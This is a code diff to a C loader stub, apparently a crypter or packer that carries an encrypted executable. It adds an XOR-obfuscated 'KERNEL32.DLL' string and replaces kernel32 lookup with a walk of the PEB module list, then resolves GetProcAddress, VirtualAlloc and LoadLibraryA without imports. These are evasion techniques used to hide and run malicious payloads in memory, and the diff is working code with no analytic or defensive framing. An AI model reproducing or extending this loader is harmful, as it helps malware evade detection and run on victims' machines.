@@ -6,6 +6,7 @@ void* encrypted_exe = &key; // dereference ptr for reloc entry
 uint32_t size = 1;
 
 char xorKey[] = { 0x2f, 0x84, 0x18, 0x8e, 0x13, 0xaa, 0x49, 0xed, 0xa7, 0x57, 0xda, 0x2b, 0xf4, 0x61, 0x8b };
+char strKernel32[] = { 0x64, 0xc1, 0x4a, 0xc0, 0x56, 0xe6, 0x7a, 0xdf, 0x89, 0x13, 0x96, 0x67 };
 char strGetProcAddress[] = { 0x68, 0xe1, 0x6c, 0xde, 0x61, 0xc5, 0x2a, 0xac, 0xc3, 0x33, 0xa8, 0x4e, 0x87, 0x12, 0x8b };
 char strVirtualAlloc[] = { 0x79, 0xed, 0x6a, 0xfa, 0x66, 0xcb, 0x25, 0xac, 0xcb, 0x3b, 0xb5, 0x48, 0xf4 };
 char strLoadLibraryA[] = { 0x63, 0xeb, 0x79, 0xea, 0x5f, 0xc3, 0x2b, 0x9f, 0xc6, 0x25, 0xa3, 0x6a, 0xf4 };
@@ -21,10 +22,42 @@ uint8_t* findKernel32Base()
 {
 	PPEB peb = *(PPEB*)(_readgsbase_u64() + 0x60);
 	PPEB_LDR_DATA ldr = peb->Ldr;
-	PLIST_ENTRY thisImage = ldr->InMemoryOrderModuleList.Flink;
-	PLIST_ENTRY ntdll = thisImage->Flink;
-	uint8_t* kernel32 = (uint8_t*)ntdll->Flink;
-	return *(void**)(kernel32 + (sizeof(PVOID) * 4));
+	PLDR_DATA_TABLE_ENTRY64 firstEntry = CONTAINING_RECORD(
+		ldr->InMemoryOrderModuleList.Flink,
+		LDR_DATA_TABLE_ENTRY64,
+		InMemoryOrderModuleList.Flink);
+	PLDR_DATA_TABLE_ENTRY64 dll = CONTAINING_RECORD(
+		firstEntry->InMemoryOrderModuleList.Flink,
+		LDR_DATA_TABLE_ENTRY64,
+		InMemoryOrderModuleList.Flink);
+
+	for (;dll != firstEntry; dll = CONTAINING_RECORD(
+			dll->InMemoryOrderModuleList.Flink,
+			LDR_DATA_TABLE_ENTRY64,
+			InMemoryOrderModuleList.Flink))
+	{
+		if (dll->BaseDllName.Length != sizeof(strKernel32) * 2)
+		{
+			continue;
+		}
+
+		// strcmp with wchar_t and char arrays
+		for (int i = 0; i < sizeof(strKernel32); i++)
+		{
+			if (dll->BaseDllName.Buffer[i] != strKernel32[i])
+			{
+				break;
+			}
+
+			// if this is the last character in the string
+			if (i + 1 == sizeof(strKernel32))
+			{
+				return dll->BaseAddress;
+			}
+		}
+	}
+
+	return NULL;
 }
 
 void decryptStrings()
@@ -40,6 +73,10 @@ void decryptStrings()
 	for (int i = 0; i < sizeof(strLoadLibraryA); i++)
 	{
 		strLoadLibraryA[i] ^= xorKey[i];
+	}
+	for (int i = 0; i < sizeof(strKernel32); i++)
+	{
+		strKernel32[i] ^= xorKey[i];
 	}
 }
 
@@ -180,11 +217,14 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 #endif
 {
-	// find vAddr of kernel32.dll
-	uint8_t* kernel32Base = findKernel32Base();
-	
+	uint8_t* kernel32Base;
+
 	// decrypt function name strings
 	decryptStrings();
+
+	// find vAddr of kernel32.dll
+	kernel32Base = findKernel32Base();
+	if (!kernel32Base) return -1;
 
 	// find GetProcAddress
 	ntHeader = (PIMAGE_NT_HEADERS)(kernel32Base + ((IMAGE_DOS_HEADER*)kernel32Base)->e_lfanew);
